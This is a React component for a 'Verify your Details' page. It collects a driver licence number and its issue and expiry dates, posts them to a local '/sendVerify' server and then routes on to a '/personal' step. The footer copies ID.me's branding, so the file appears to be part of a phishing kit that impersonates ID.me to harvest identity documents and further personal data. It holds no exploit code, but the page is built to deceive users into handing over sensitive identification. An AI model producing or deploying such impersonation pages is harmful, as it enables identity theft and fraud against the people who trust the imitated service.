import React, { useState } from "react";
import id from "../assets/id.png";
import download from "../assets/download2.png";
import { useNavigate } from "react-router-dom";

const Verify = () => {
  const [currentErrorField, setCurrentErrorField] = useState(null);
  const navigate = useNavigate();

  const [errors, setErrors] = useState({
    licenseNumber: false,
    issueDate: false,
    expireDate: false,
  });

  const [formData, setFormData] = useState({
    licenseNumber: "",
    issueDate: "",
    expireDate: "",
  });

  // Simple dd-mm-yyyy date format validator
  const isValidDateFormat = (dateStr) => {
    // Matches dd-mm-yyyy where dd 01-31, mm 01-12, yyyy 4 digits
    const regex = /^(0[1-9]|[12][0-9]|3[01])-(0[1-9]|1[0-2])-\d{4}$/;
    return regex.test(dateStr);
  };

  const validateField = (fieldName) => {
    let isValid = false;
    if (fieldName === "licenseNumber") {
      isValid = formData.licenseNumber.trim() !== "";
    } else if (fieldName === "issueDate") {
      isValid = formData.issueDate.trim() !== "" && isValidDateFormat(formData.issueDate.trim());
    } else if (fieldName === "expireDate") {
      isValid = formData.expireDate.trim() !== "" && isValidDateFormat(formData.expireDate.trim());
    }
    setErrors((prev) => ({ ...prev, [fieldName]: !isValid }));
    return isValid;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));

    if (currentErrorField === name) {
      setErrors((prev) => ({ ...prev, [name]: !value.trim() }));
    }
  };

  const handleDateInputChange = (fieldName, value) => {
    // Format input as dd-mm-yyyy while typing
    const raw = value.replace(/\D/g, ""); // digits only
    let formatted = "";
    if (raw.length <= 2) {
      formatted = raw;
    } else if (raw.length <= 4) {
      formatted = `${raw.slice(0, 2)}-${raw.slice(2)}`;
    } else {
      formatted = `${raw.slice(0, 2)}-${raw.slice(2, 4)}-${raw.slice(4, 8)}`;
    }

    setFormData((prev) => ({ ...prev, [fieldName]: formatted }));

    if (currentErrorField === fieldName) {
      setErrors((prev) => ({ ...prev, [fieldName]: !formatted.trim() }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Validate in order
    if (!validateField("licenseNumber")) {
      setCurrentErrorField("licenseNumber");
      return;
    }
    if (!validateField("issueDate")) {
      setCurrentErrorField("issueDate");
      return;
    }
    if (!validateField("expireDate")) {
      setCurrentErrorField("expireDate");
      return;
    }

    setCurrentErrorField(null);

    try {
      const response = await fetch("http://localhost:4000/sendVerify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });

      if (!response.ok) {
        throw new Error("Failed to send details to server");
      }

      console.log("Details sent successfully!");
      navigate("/personal");
    } catch (error) {
      console.error("Error sending details:", error);
      // Optionally show an error message to user here
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-[#ffffff]">
      {/* Header */}
      <div className="w-full h-28 bg-white shadow-md flex justify-center items-center space-x-2 p-2 sm:bg-white bg-gradient-to-b from-[#ffffff] to-[#f2f1f1]">
        <img src={id} alt="User ID Icon" className="w-20" />
        <h1 className="text-lg font-bold">+</h1>
        <img src={download} alt="Download Icon" className="w-24" />
      </div>

      <div className="w-full gap-3 max-w-[500px] bg-white px-4 py-6 sm:px-8 sm:py-10 rounded-xl shadow-lg border border-gray-300 mx-auto flex flex-col items-center">
        <h1 className="text-2xl sm:text-xl font-bold text-center mb-4 sm:mb-8">
          Verify your Details
        </h1>

        <form
          onSubmit={handleSubmit}
          className="flex flex-col items-center space-y-7 w-full max-w-md mx-auto"
          noValidate
        >
          {/* License Number */}
          <div className="w-full ">
            <label className="text-md font-semibold mb-2 block">
              Driver License Number
            </label>
            <input
              name="licenseNumber"
              type="text"
              value={formData.licenseNumber}
              onChange={handleChange}
              onBlur={() => validateField("licenseNumber")}
              className={`w-full h-[65px] border-gray-500 px-4 py-2 border-2 rounded-md tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                errors.licenseNumber
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-300 focus:ring-2 focus:ring-blue-600"
              }`}
            />
            {errors.licenseNumber && (
              <p className="text-red-500 text-sm mt-1">Fill out this field</p>
            )}
          </div>

          {/* Date of Issue */}
          <div className="w-full  space-x-1">
            <label className="text-md font-semibold mb-2 block">
              Date of Issue
            </label>
            <input
              name="issueDate"
              type="text"
              placeholder="dd-mm-yyyy"
              maxLength={10}
              value={formData.issueDate}
              onChange={(e) => handleDateInputChange("issueDate", e.target.value)}
              onBlur={() => validateField("issueDate")}
              className={`w-full px-4 py-2 border-2 rounded tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                errors.issueDate
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-500 focus:ring-2 focus:ring-blue-700"
              }`}
            />
            {errors.issueDate && (
              <p className="text-red-500 text-sm mt-1">
                Please enter a valid date (dd-mm-yyyy)
              </p>
            )}
          </div>

          {/* Date of Expiry */}
          <div className="w-full  space-x-1">
            <label className="text-md font-semibold mb-2 block">
              Date of Expiry
            </label>
            <input
              name="expireDate"
              type="text"
              placeholder="dd-mm-yyyy"
              maxLength={10}
              value={formData.expireDate}
              onChange={(e) => handleDateInputChange("expireDate", e.target.value)}
              onBlur={() => validateField("expireDate")}
              className={`w-full px-4 py-2 border-2 rounded tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                errors.expireDate
                  ? "border-red-500 focus:ring-2 focus:ring-red-500"
                  : "border-gray-500 focus:ring-2 focus:ring-blue-700"
              }`}
            />
            {errors.expireDate && (
              <p className="text-red-500 text-sm mt-1">
                Please enter a valid date (dd-mm-yyyy)
              </p>
            )}
          </div>

          <button
            type="submit"
            className="w-full py-3 sm:py-4 bg-blue-700 text-white rounded-lg mt-2 hover:bg-blue-800 transition-colors text-sm sm:text-lg"
          >
            Continue
          </button>
        </form>
      </div>

      {/* Footer */}
      <footer className="w-full shadow-md bg-[#f5f5f5] flex flex-col items-center justify-center p-4 text-xs sm:text-sm text-[#2e3f5b] space-y-2">
        <div className="underline text-blue-600 cursor-pointer">English</div>
        <div className="flex flex-wrap items-center justify-center gap-2 sm:gap-4 text-center cursor-pointer">
          <span>What is ID.me?</span>
          <span className="border-l border-black h-3" />
          <span>Terms of Service</span>
          <span className="border-l border-black h-3" />
          <span>Privacy Policy</span>
        </div>
      </footer>
    </div>
  );
};

export default Verify;
